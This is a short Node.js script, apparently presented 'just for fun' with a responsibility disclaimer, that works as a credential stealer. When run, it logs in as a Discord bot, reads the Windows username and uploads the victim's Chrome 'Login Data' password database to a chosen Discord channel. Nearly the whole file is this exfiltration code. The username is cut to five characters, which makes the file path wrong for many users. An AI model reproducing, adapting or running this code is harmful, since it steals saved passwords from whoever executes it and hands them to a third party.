// just for fun (I AM NOT RESPONSIBLE FOR ANY MISUSE) anyone running this will have their chrome sqlite password database file sent to a specified channel
const Discord = require('discord.js')
const client = new Discord.Client()

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    var localChannel = client.channels.cache.get('XXX'); // send channel

	const { exec } = require("child_process");

	exec("echo %USERNAME%", (error, stdout, stderr) => {
		if (stderr) {
			console.log(`stderr: ${stderr}`);
			return;
		}
		user = stdout.slice(0, 5);
		localChannel.send( { files: [`C:\\Users\\${user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`]} );
	});
    
})


//Logs into the bot
client.login('token').catch(()=>{
    console.error("Invalid token")
})
